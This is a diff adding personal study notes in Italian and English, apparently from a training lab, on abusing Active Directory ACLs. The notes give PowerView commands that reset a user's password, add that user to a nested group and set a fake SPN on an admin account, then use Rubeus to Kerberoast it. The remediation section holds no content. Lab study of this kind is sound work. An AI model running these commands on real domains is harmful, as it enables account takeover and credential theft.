@@ -1037,4 +1037,77 @@ Let's look and see if this group is nested into any other groups, remembering th
 Node info
 
 
+# Abusing ACL
+SCENARIO: Noi controlliamo  l'utente **wley** , abbiamo i permessi per cambiare la password all'utente **damundsen**.
 
+1) Usiamo Wley per cambiare password a damundsen
+2) Ci autentichiamo come damundsen che ha permessi **GenericWrite** e lo sfruttiamo per aggiungere un utente che controlliamo al gruppo **Help Desk 1**
+3) Sfruttiamo la nested group membership e i permessi **GenericAll**  per prendere controllo dell' utente **adunn**
+
+
+## Modificare la password di un tizio dove abbiamo i privilegi per farlo
+
+### Create a PSCredential object
+```
+PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
+```
+
+### Create a Secure String Object
+`PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`
+
+
+### Changing User Password
+```
+PS C:\htb> cd C:\Tools\
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
+VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
+```
+
+### Creiamo Secure String con damunsden
+```
+PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+```
+
+### Aggiungiamo damundsen a Help Desk level 1
+`PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members`
+ (Si puo' anche fare da linux con **pth-toolkit**).
+
+`PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`
+
+
+### COnfermiamo ch abbiamo aggiunto
+`PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName`
+
+
+### Creiamo fake SPN
+
+At this point, we should be able to leverage our new group membership to take control over the adunn user. Now, let's say that our client permitted us to change the password of the damundsen user, but the adunn user is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.
+
+We must be authenticated as a member of the Information Technology group for this to be successful. Since we added damundsen to the Help Desk Level 1 group, we inherited rights via nested group membership. We can now use Set-DomainObject to create the fake SPN. We could use the tool targetedKerberoast to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.
+
+`PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`
+
+
+### Kerberoasting con Rubeus.exe
+`PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap`
+
+
+## Cleanup
+
+
+In terms of cleanup, there are a few things we need to do:
+
+1) Remove the fake SPN we created on the adunn user. (`PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`)
+2) Remove the damundsen user from the Help Desk Level 1 group (`PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose`), conferma `PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose`
+3) Set the password for the damundsen user back to its original value (if we know it) or have our client set it/alert the user
+
+
+
+### Remediation 
+booo che noia
